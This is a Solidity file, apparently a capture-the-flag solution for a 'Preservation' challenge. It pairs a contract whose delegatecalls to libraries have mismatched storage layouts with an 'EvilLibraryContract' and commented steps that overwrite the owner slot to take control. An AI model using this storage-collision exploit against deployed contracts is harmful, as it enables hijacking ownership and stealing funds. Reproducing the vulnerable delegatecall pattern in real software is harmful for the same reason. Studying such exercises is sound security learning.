pragma solidity ^0.4.23;

contract Preservation {

    // public library contracts
    address public timeZone1Library;
    address public timeZone2Library;
    address public owner;
    uint storedTime;
    // Sets the function signature for delegatecall
    bytes4 constant setTimeSignature = bytes4(keccak256("setTime(uint256)"));

    constructor(address _timeZone1LibraryAddress, address _timeZone2LibraryAddress) public {
        timeZone1Library = _timeZone1LibraryAddress;
        timeZone2Library = _timeZone2LibraryAddress;
        owner = msg.sender;
    }

    // set the time for timezone 1
    function setFirstTime(uint _timeStamp) public {
        timeZone1Library.delegatecall(setTimeSignature, _timeStamp);
    }

    // set the time for timezone 2
    function setSecondTime(uint _timeStamp) public {
        timeZone2Library.delegatecall(setTimeSignature, _timeStamp);
    }
}

// Simple library contract to set the time
contract LibraryContract {

    // stores a timestamp
    uint storedTime;

    function setTime(uint _time) public {
        storedTime = _time;
    }
}

contract EvilLibraryContract {

    // stores a timestamp
    uint storedTime;
    address public timeZone1Library;
    address public owner;

    function setTime(uint _time) public {
        storedTime = _time;
        timeZone1Library = address(_time);
        owner = tx.origin;
    }
}
/*
1. Deploy EvilLibraryContract -> evil_address
2. contract.setSecondTime("evil_address")
-> storedTime = storage at 0x0 = timeZone1Library = evil_address
3. contract.setFirstTime("evil_address")
-> timeZone1Library = evil_address
In EvilLibraryContract:
- storedTime = storage at 0x0 = timeZone1Library
- timeZone1Library = storage at 0x1 = timeZone2Library
- owner = storage at 0x2 = owner = tx.origin

Ref:
- https://ethereum.stackexchange.com/questions/3667/difference-between-call-callcode-and-delegatecall/3672#3672
- https://github.com/ethereum/solidity/issues/4080
- https://blog.qtum.org/diving-into-the-ethereum-vm-6e8d5d2f3c30
- https://solidity.readthedocs.io/en/latest/miscellaneous.html#layout-of-state-variables-in-storage
- https://ethereum.stackexchange.com/questions/46623/can-i-define-global-variables-in-library-contract
*/
